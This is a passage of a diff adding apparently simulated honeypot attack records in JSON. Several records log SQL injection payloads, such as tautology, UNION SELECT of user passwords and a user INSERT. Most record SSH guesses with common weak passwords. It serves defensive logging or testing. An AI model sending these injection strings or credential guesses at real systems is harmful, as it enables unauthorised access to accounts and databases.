+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:20:15.418229",
+    "source_ip": "218.110.147.171",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "'; INSERT INTO users VALUES ('hacker', 'password') --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:20:15.418229 [HoneyPotWeb,0,218.110.147.171] SQL injection attempt: '; INSERT INTO users VALUES ('hacker', 'password') --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "74cb8a7fe4f3fb9b243ebae9dcf8e8fe"
+  },
+  "710d20f6-26c1-4e4f-af74-f4110ff2b040": {
+    "id": "710d20f6-26c1-4e4f-af74-f4110ff2b040",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:20:21.104151",
+    "source_ip": "219.52.19.150",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "'; INSERT INTO users VALUES ('hacker', 'password') --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:20:21.104151 [HoneyPotWeb,0,219.52.19.150] SQL injection attempt: '; INSERT INTO users VALUES ('hacker', 'password') --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "e2998177f416073af07fc3e4af19de07"
+  },
+  "b112a4bc-5c8e-420b-a02f-c2def474b357": {
+    "id": "b112a4bc-5c8e-420b-a02f-c2def474b357",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:20:27.401544",
+    "source_ip": "48.142.6.72",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "' OR username LIKE '%admin%",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:20:27.401544 [HoneyPotWeb,0,48.142.6.72] SQL injection attempt: ' OR username LIKE '%admin%",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "5c076eb2bbf3de1310f30b092832c8e0"
+  },
+  "e556632b-b7f3-4b9e-bd71-f5baeae3caca": {
+    "id": "e556632b-b7f3-4b9e-bd71-f5baeae3caca",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:20:33.102272",
+    "source_ip": "194.139.32.186",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "' UNION SELECT username, password FROM users --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:20:33.102272 [HoneyPotWeb,0,194.139.32.186] SQL injection attempt: ' UNION SELECT username, password FROM users --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "edf6ddc3f40e23682bed1ac24637b741"
+  },
+  "9d4a3be3-d970-4982-81c6-9ad6d7f16f79": {
+    "id": "9d4a3be3-d970-4982-81c6-9ad6d7f16f79",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:20:39.110172",
+    "source_ip": "216.254.29.213",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "' UNION SELECT username, password FROM users --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:20:39.110172 [HoneyPotWeb,0,216.254.29.213] SQL injection attempt: ' UNION SELECT username, password FROM users --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "60a673db6db320a1677caeafbaf74626"
+  },
+  "cbcbdd86-ad1d-408e-bdbe-c75bfa9dbcbf": {
+    "id": "cbcbdd86-ad1d-408e-bdbe-c75bfa9dbcbf",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:20:45.100200",
+    "source_ip": "194.141.182.219",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "' UNION SELECT username, password FROM users --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:20:45.100200 [HoneyPotWeb,0,194.141.182.219] SQL injection attempt: ' UNION SELECT username, password FROM users --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "e8995fefb6efed03dfc888b57895d039"
+  },
+  "7093fc48-fd66-4447-b35d-a5e93403ef3a": {
+    "id": "7093fc48-fd66-4447-b35d-a5e93403ef3a",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 17:52:32",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "admin",
+    "details": {
+      "raw_log": "2025-04-02T17:52:32+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'admin'] failed"
+    },
+    "attack_hash": "9aaf9fb595fa39b962826c8146beb1ae"
+  },
+  "effc518f-c413-4587-bcea-809092d9ed14": {
+    "id": "effc518f-c413-4587-bcea-809092d9ed14",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 17:52:39",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "hostdevraj",
+    "details": {
+      "raw_log": "2025-04-02T17:52:39+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'hostdevraj'] failed"
+    },
+    "attack_hash": "71da39d05f5698e820762a624ae6172c"
+  },
+  "079b260b-37f3-4b7a-9ed6-abf78cc209be": {
+    "id": "079b260b-37f3-4b7a-9ed6-abf78cc209be",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 17:52:46",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "dj",
+    "details": {
+      "raw_log": "2025-04-02T17:52:46+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'dj'] failed"
+    },
+    "attack_hash": "2acbaaa9a84756cab6a0a40cec5a868f"
+  },
+  "51c45f56-e627-472e-b4ca-0a8a6c484560": {
+    "id": "51c45f56-e627-472e-b4ca-0a8a6c484560",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:06:13.477527",
+    "source_ip": "95.32.96.152",
+    "attack_type": "login_attempt",
+    "username": "devrajsinh jhala",
+    "password": "devrajsinh jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:06:13.477527 [HoneyPotSSHTransport,0,95.32.96.152] login attempt [b'devrajsinh jhala'/b'devrajsinh jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 7
+    },
+    "attack_hash": "e6a9c0e5da79126593fe3fb618388d2b"
+  },
+  "ba377c7e-52b6-4dd8-ba05-27901bf779b3": {
+    "id": "ba377c7e-52b6-4dd8-ba05-27901bf779b3",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:06:19.776003",
+    "source_ip": "104.248.100.79",
+    "attack_type": "login_attempt",
+    "username": "postgres",
+    "password": "devrajsinh jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:06:19.776003 [HoneyPotSSHTransport,0,104.248.100.79] login attempt [b'postgres'/b'devrajsinh jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 2
+    },
+    "attack_hash": "e5643952f534fd96016039e7f0bec047"
+  },
+  "503220fe-3a76-46bc-9399-a48b78350260": {
+    "id": "503220fe-3a76-46bc-9399-a48b78350260",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:06:26.184165",
+    "source_ip": "172.149.39.112",
+    "attack_type": "login_attempt",
+    "username": "devrajsinh jhala",
+    "password": "devrajsinh jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:06:26.184165 [HoneyPotSSHTransport,0,172.149.39.112] login attempt [b'devrajsinh jhala'/b'devrajsinh jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 4
+    },
+    "attack_hash": "e716a346ee7180cb4f74b68542bc373f"
+  },
+  "9a43b78e-049d-4b78-83c8-9a8eebe8690f": {
+    "id": "9a43b78e-049d-4b78-83c8-9a8eebe8690f",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:06:31.471178",
+    "source_ip": "58.222.6.61",
+    "attack_type": "login_attempt",
+    "username": "ec2-user",
+    "password": "P@ssw0rd!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:06:31.471178 [HoneyPotSSHTransport,0,58.222.6.61] login attempt [b'ec2-user'/b'P@ssw0rd!'] failed",
+      "login_method": "ssh",
+      "attempts": 3
+    },
+    "attack_hash": "12a52ff15fd34982120d206427455e31"
+  },
+  "e4abf872-8158-4dac-be81-426aeec7f74e": {
+    "id": "e4abf872-8158-4dac-be81-426aeec7f74e",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:06:37.778633",
+    "source_ip": "194.17.246.176",
+    "attack_type": "login_attempt",
+    "username": "ssh",
+    "password": "Welcome2022!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:06:37.778633 [HoneyPotSSHTransport,0,194.17.246.176] login attempt [b'ssh'/b'Welcome2022!'] failed",
+      "login_method": "ssh",
+      "attempts": 10
+    },
+    "attack_hash": "6f14a8babc2d61a517337d3957c9829c"
+  },
+  "73fdaa88-0d06-47ba-9810-f208cf379d46": {
+    "id": "73fdaa88-0d06-47ba-9810-f208cf379d46",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:06:43.469773",
+    "source_ip": "58.91.68.23",
+    "attack_type": "login_attempt",
+    "username": "ssh",
+    "password": "P@ssw0rd!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:06:43.469773 [HoneyPotSSHTransport,0,58.91.68.23] login attempt [b'ssh'/b'P@ssw0rd!'] failed",
+      "login_method": "ssh",
+      "attempts": 3
+    },
+    "attack_hash": "5e87ec287496ad3333ec6c9af373e269"
+  },
+  "f93c8394-cbde-41b9-a797-5cea0a4a5bcb": {
+    "id": "f93c8394-cbde-41b9-a797-5cea0a4a5bcb",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:06:49.457913",
+    "source_ip": "8.51.236.167",
+    "attack_type": "login_attempt",
+    "username": "devrajsinh jhala",
+    "password": "devrajsinh jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:06:49.457913 [HoneyPotSSHTransport,0,8.51.236.167] login attempt [b'devrajsinh jhala'/b'devrajsinh jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 10
+    },
+    "attack_hash": "45507123899ef5569fca3b420f7667fc"
+  },
+  "fd476d77-e598-4bf6-8ff8-4ad06fa18289": {
+    "id": "fd476d77-e598-4bf6-8ff8-4ad06fa18289",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:06:55.779710",
+    "source_ip": "176.221.70.254",
+    "attack_type": "login_attempt",
+    "username": "azureuser",
+    "password": "r00tme",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:06:55.779710 [HoneyPotSSHTransport,0,176.221.70.254] login attempt [b'azureuser'/b'r00tme'] failed",
+      "login_method": "ssh",
+      "attempts": 6
+    },
+    "attack_hash": "04788c322580f1f9f6b3dff511397f41"
+  },
+  "34b77cd3-205b-4390-9779-5eac63514be4": {
+    "id": "34b77cd3-205b-4390-9779-5eac63514be4",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:07:01.468412",
+    "source_ip": "95.153.146.23",
+    "attack_type": "login_attempt",
+    "username": "admin",
+    "password": "ssh@4258",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:07:01.468412 [HoneyPotSSHTransport,0,95.153.146.23] login attempt [b'admin'/b'ssh@4258'] failed",
+      "login_method": "ssh",
+      "attempts": 5
+    },
+    "attack_hash": "82a9184a498af8108b280d18ce3449ea"
+  },
+  "db966462-e676-4bd5-a598-74da7dcbf1a6": {
+    "id": "db966462-e676-4bd5-a598-74da7dcbf1a6",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:30:32.361510",
+    "source_ip": "176.190.120.23",
+    "attack_type": "login_attempt",
+    "username": "postgres",
+    "password": "ssh@4784",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:30:32.361510 [HoneyPotSSHTransport,0,176.190.120.23] login attempt [b'postgres'/b'ssh@4784'] failed",
+      "login_method": "ssh",
+      "attempts": 9
+    },
+    "attack_hash": "dfb620cdd7ba1544c3ed747b38ea4145"
+  },
+  "40a8238c-0721-4e32-8e27-7de222912b06": {
+    "id": "40a8238c-0721-4e32-8e27-7de222912b06",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:30:38.351816",
+    "source_ip": "34.190.119.117",
+    "attack_type": "login_attempt",
+    "username": "ubuntu",
+    "password": "devrajsinh jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:30:38.351816 [HoneyPotSSHTransport,0,34.190.119.117] login attempt [b'ubuntu'/b'devrajsinh jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 8
+    },
+    "attack_hash": "4cbb02615573661ce374453146c5a5db"
+  },
+  "62848db6-7a06-41b2-81c6-609b684374cd": {
+    "id": "62848db6-7a06-41b2-81c6-609b684374cd",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:30:44.355595",
+    "source_ip": "104.17.223.225",
+    "attack_type": "login_attempt",
+    "username": "ssh",
+    "password": "devrajsinh jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:30:44.355595 [HoneyPotSSHTransport,0,104.17.223.225] login attempt [b'ssh'/b'devrajsinh jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 2
+    },
+    "attack_hash": "9bd79bdb7fc9f2c9dcb3cf1ab72d0e22"
+  },
+  "99f83f99-a6c9-40d5-ba4a-5036aa32652a": {
+    "id": "99f83f99-a6c9-40d5-ba4a-5036aa32652a",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:30:50.352830",
+    "source_ip": "95.167.17.240",
+    "attack_type": "login_attempt",
+    "username": "admin",
+    "password": "P@ssw0rd!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:30:50.352830 [HoneyPotSSHTransport,0,95.167.17.240] login attempt [b'admin'/b'P@ssw0rd!'] failed",
+      "login_method": "ssh",
+      "attempts": 4
+    },
+    "attack_hash": "4996d9430ae34101f1fbb17ecfa39df6"
+  },
+  "dd02cc07-d43b-4ac2-b045-9d4bb97fbf10": {
+    "id": "dd02cc07-d43b-4ac2-b045-9d4bb97fbf10",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:30:56.041649",
+    "source_ip": "95.67.21.107",
+    "attack_type": "login_attempt",
+    "username": "devrajsinh jhala",
+    "password": "devrajsinh jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:30:56.041649 [HoneyPotSSHTransport,0,95.67.21.107] login attempt [b'devrajsinh jhala'/b'devrajsinh jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 8
+    },
+    "attack_hash": "8a755ffbfb3fb62fe94f3e1965025e4e"
+  },
+  "edf712a5-942f-4e59-8155-cd9db8fac019": {
+    "id": "edf712a5-942f-4e59-8155-cd9db8fac019",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:31:02.356397",
+    "source_ip": "172.40.68.18",
+    "attack_type": "login_attempt",
+    "username": "ssh",
+    "password": "ssh@7865",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:31:02.356397 [HoneyPotSSHTransport,0,172.40.68.18] login attempt [b'ssh'/b'ssh@7865'] failed",
+      "login_method": "ssh",
+      "attempts": 7
+    },
+    "attack_hash": "26dc1f6cea822c97b80eaee87562ea44"
+  },
+  "7c4c9d24-8bec-4692-8529-8d1fc9ba9a66": {
+    "id": "7c4c9d24-8bec-4692-8529-8d1fc9ba9a66",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:31:08.350369",
+    "source_ip": "217.213.114.188",
+    "attack_type": "login_attempt",
+    "username": "devrajsinh jhala",
+    "password": "devrajsinh jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:31:08.350369 [HoneyPotSSHTransport,0,217.213.114.188] login attempt [b'devrajsinh jhala'/b'devrajsinh jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 6
+    },
+    "attack_hash": "f45088e362955864be8bba5d0cc815ee"
+  },
+  "12b3f155-82ae-46ce-83ef-90e0ec928c32": {
+    "id": "12b3f155-82ae-46ce-83ef-90e0ec928c32",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:31:14.352067",
+    "source_ip": "62.103.124.84",
+    "attack_type": "login_attempt",
+    "username": "devrajsinh jhala",
+    "password": "devrajsinh jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:31:14.352067 [HoneyPotSSHTransport,0,62.103.124.84] login attempt [b'devrajsinh jhala'/b'devrajsinh jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 9
+    },
+    "attack_hash": "6b1f3d4db647c2529821f41127a76f47"
+  },
+  "37030594-49b9-4f16-ab82-86615af8c401": {
+    "id": "37030594-49b9-4f16-ab82-86615af8c401",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-03 01:31:20.354959",
+    "source_ip": "45.200.1.207",
+    "attack_type": "login_attempt",
+    "username": "tomcat",
+    "password": "P@ssw0rd!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-03T01:31:20.354959 [HoneyPotSSHTransport,0,45.200.1.207] login attempt [b'tomcat'/b'P@ssw0rd!'] failed",
+      "login_method": "ssh",
+      "attempts": 8
+    },
+    "attack_hash": "e91744382324b2fc57a3ea2874e65953"
+  },
+  "319c4aee-8163-4696-921c-00c0fb64d60f": {
+    "id": "319c4aee-8163-4696-921c-00c0fb64d60f",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:24:03.225275",
+    "source_ip": "45.219.214.215",
+    "attack_type": "login_attempt",
+    "username": "root",
+    "password": "P@ssw0rd!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:24:03.225275 [HoneyPotSSHTransport,0,45.219.214.215] login attempt [b'root'/b'P@ssw0rd!'] failed",
+      "login_method": "ssh",
+      "attempts": 2
+    },
+    "attack_hash": "9b2647d0c1151e58f6e9d47b8264de15"
+  },
+  "111c28d0-f0dd-4c27-8080-f2551b3eb0b7": {
+    "id": "111c28d0-f0dd-4c27-8080-f2551b3eb0b7",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:24:09.484768",
+    "source_ip": "62.16.187.225",
+    "attack_type": "login_attempt",
+    "username": "devrajsinh jhala",
+    "password": "r00tme",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:24:09.484768 [HoneyPotSSHTransport,0,62.16.187.225] login attempt [b'devrajsinh jhala'/b'r00tme'] failed",
+      "login_method": "ssh",
+      "attempts": 3
+    },
+    "attack_hash": "46afc4becf990c2e40f074ba3f285e46"
+  },
+  "388f671d-79f8-4b99-a3b0-04791e332407": {
+    "id": "388f671d-79f8-4b99-a3b0-04791e332407",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:24:15.168374",
+    "source_ip": "176.154.89.144",
+    "attack_type": "login_attempt",
+    "username": "root",
+    "password": "ssh@3275",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:24:15.168374 [HoneyPotSSHTransport,0,176.154.89.144] login attempt [b'root'/b'ssh@3275'] failed",
+      "login_method": "ssh",
+      "attempts": 4
+    },
+    "attack_hash": "04e75fc753d3e4c05b67594802b8b1a8"
+  },
+  "57eeca77-a9ac-49e9-af46-6d42e6745a32": {
+    "id": "57eeca77-a9ac-49e9-af46-6d42e6745a32",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:24:21.487590",
+    "source_ip": "58.51.175.209",
+    "attack_type": "login_attempt",
+    "username": "ec2-user",
+    "password": "P@ssw0rd!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:24:21.487590 [HoneyPotSSHTransport,0,58.51.175.209] login attempt [b'ec2-user'/b'P@ssw0rd!'] failed",
+      "login_method": "ssh",
+      "attempts": 5
+    },
+    "attack_hash": "c0dafd6424af77afe38b7f22a2ddc3b3"
+  },
+  "71cf788c-9ff6-4fc7-b739-aaf3ff193a0c": {
+    "id": "71cf788c-9ff6-4fc7-b739-aaf3ff193a0c",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:24:27.170833",
+    "source_ip": "58.183.150.173",
+    "attack_type": "login_attempt",
+    "username": "devrajsinh jhala",
+    "password": "devrajsinh jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:24:27.170833 [HoneyPotSSHTransport,0,58.183.150.173] login attempt [b'devrajsinh jhala'/b'devrajsinh jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 5
+    },
+    "attack_hash": "f485a875221cbc13a4bc9e29ecefce1b"
+  },
+  "63f4f7d2-be1e-4fbe-baf7-435e6a9b034d": {
+    "id": "63f4f7d2-be1e-4fbe-baf7-435e6a9b034d",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:24:33.476282",
+    "source_ip": "34.174.69.183",
+    "attack_type": "login_attempt",
+    "username": "devrajsinh jhala",
+    "password": "devrajsinh jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:24:33.476282 [HoneyPotSSHTransport,0,34.174.69.183] login attempt [b'devrajsinh jhala'/b'devrajsinh jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 5
+    },
+    "attack_hash": "2b14f13fd08d72fb9fc4619b33e45a24"
+  },
+  "7c375f57-b4bb-4a9f-8406-a15a17009858": {
+    "id": "7c375f57-b4bb-4a9f-8406-a15a17009858",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:24:39.488457",
+    "source_ip": "104.115.123.127",
+    "attack_type": "login_attempt",
+    "username": "jenkins",
+    "password": "r00tme",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:24:39.488457 [HoneyPotSSHTransport,0,104.115.123.127] login attempt [b'jenkins'/b'r00tme'] failed",
+      "login_method": "ssh",
+      "attempts": 10
+    },
+    "attack_hash": "44c7a3e05264d26ab55e0fa99d585a24"
+  },
+  "06b392ae-639f-4ebf-8de6-649190b9a524": {
+    "id": "06b392ae-639f-4ebf-8de6-649190b9a524",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:24:45.178737",
+    "source_ip": "13.163.163.53",
+    "attack_type": "login_attempt",
+    "username": "azureuser",
+    "password": "Adm1n@123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:24:45.178737 [HoneyPotSSHTransport,0,13.163.163.53] login attempt [b'azureuser'/b'Adm1n@123'] failed",
+      "login_method": "ssh",
+      "attempts": 7
+    },
+    "attack_hash": "1cba03b61081ffa1f99a4768388e8710"
+  },
+  "13fab54e-b4b2-494e-ba8c-b00247f3c1f9": {
+    "id": "13fab54e-b4b2-494e-ba8c-b00247f3c1f9",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:24:51.490226",
+    "source_ip": "176.100.141.155",
+    "attack_type": "login_attempt",
+    "username": "postgres",
+    "password": "ssh@3268",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:24:51.490226 [HoneyPotSSHTransport,0,176.100.141.155] login attempt [b'postgres'/b'ssh@3268'] failed",
+      "login_method": "ssh",
+      "attempts": 5
+    },
+    "attack_hash": "43969bf190a01ac834bd8e53e0711d9a"
+  },
+  "ff0c11f8-adc8-4c59-93b9-80eca01543ef": {
+    "id": "ff0c11f8-adc8-4c59-93b9-80eca01543ef",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:24:57.170521",
+    "source_ip": "95.61.195.234",
+    "attack_type": "login_attempt",
+    "username": "ssh",
+    "password": "ssh@1119",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:24:57.170521 [HoneyPotSSHTransport,0,95.61.195.234] login attempt [b'ssh'/b'ssh@1119'] failed",
+      "login_method": "ssh",
+      "attempts": 9
+    },
+    "attack_hash": "c64d25e0229098a8314afe0e6bbfc3db"
+  },
+  "ac9509f3-5dc3-464d-a33c-6485a9256140": {
+    "id": "ac9509f3-5dc3-464d-a33c-6485a9256140",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:25:03.489574",
+    "source_ip": "185.188.125.107",
+    "attack_type": "login_attempt",
+    "username": "devrajsinh jhala",
+    "password": "devrajsinh jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:25:03.489574 [HoneyPotSSHTransport,0,185.188.125.107] login attempt [b'devrajsinh jhala'/b'devrajsinh jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 2
+    },
+    "attack_hash": "b9617b4da66b0ba036d7f991db9b4512"
+  },
+  "5b27bf5c-d816-4530-8f8c-5cce4be55517": {
+    "id": "5b27bf5c-d816-4530-8f8c-5cce4be55517",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:25:09.487557",
+    "source_ip": "217.178.1.20",
+    "attack_type": "login_attempt",
+    "username": "devrajsinh jhala",
+    "password": "devrajsinh jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:25:09.487557 [HoneyPotSSHTransport,0,217.178.1.20] login attempt [b'devrajsinh jhala'/b'devrajsinh jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 6
+    },
+    "attack_hash": "c5a4ce4e64b190ae132bf76bd5cd2cd9"
+  },
+  "de3e4720-67e4-4454-9c99-8ed130a653ff": {
+    "id": "de3e4720-67e4-4454-9c99-8ed130a653ff",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:25:15.187967",
+    "source_ip": "34.53.221.83",
+    "attack_type": "login_attempt",
+    "username": "devrajsinh jhala",
+    "password": "Adm1n@123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-04T19:25:15.187967 [HoneyPotSSHTransport,0,34.53.221.83] login attempt [b'devrajsinh jhala'/b'Adm1n@123'] failed",
+      "login_method": "ssh",
+      "attempts": 10
+    },
+    "attack_hash": "4ded735ffaffa4ac3fc06fe0f9769d56"
+  },
+  "0daeacff-49b4-438b-9235-fb3d76f76d0f": {
+    "id": "0daeacff-49b4-438b-9235-fb3d76f76d0f",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-04 19:25:21.481827",
+    "source_ip": "217.215.53.132",
+    "attack_type": "login_attempt",
+    "username": "ubuntu",
+    "password": "devrajsinh jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
